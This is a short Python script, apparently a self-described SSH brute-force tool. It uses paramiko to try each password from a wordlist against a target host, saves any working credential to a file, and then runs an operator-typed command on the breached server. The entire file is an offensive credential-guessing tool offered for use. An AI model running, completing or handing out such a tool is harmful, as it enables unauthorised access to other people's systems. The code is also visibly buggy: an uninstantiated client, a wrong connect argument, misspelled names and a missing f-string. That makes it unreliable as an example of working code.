import paramiko
import socket
import time
from colorama import Fore, init

init()


RESET = Fore.RESET
RED = Fore.RED
BLUE = Fore.BLUE
def is_ssh_open(hostname, username, password):
    client = paramiko.SSHClient
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=hostname, username=username ,passphrase=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!]Host:{hostname} is unreachable, time out.(RESET)")
        return False
    except paramiko.AuthenticationException:
        print(f"{BLUE}[!]Invalid Credential for {usernam}e:{password}")
        return False
    except paramiko.SSHException:
        print(f"{BLUE}[*]Quota exceeded, retrying with delay .. {RESET}")
        time.sleed(60)
        return is_ssh_open(hostname, username, password)
    else:
        print("Found Combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        print("==> SSH Bruteforce Successfully completed")
        cmd = input("==> Type COmmand to Run on Server: ")
        stdin,stdout,stderr = client.exec_command(cmd)
        lines = stdout.readlines()
        print(*lines)
        return True




def main ():
    import argparse
    parser = argparse.ArgumentParser(description="SSH BruteForce Python Script")
    parser.add_argument("host", help="Hosrname for IP address of SSH server to Bruteforce")
    parser.add_argument("-p", "--wordlist", help="File that contain password list in each line")
    parser.add_argument("-u", "--user", help="Host username")

    args = parser.parse_args()
    host = args.host
    wordlist = args.worldlist
    user = args.user

    wordlist = open(wordlist).read().splitlines()
    for password in wordlist:
        if is_ssh_open(host,user, password):
            open("credential.txt", "w").write(f"{user}@{host}:{password}")
            break
main()





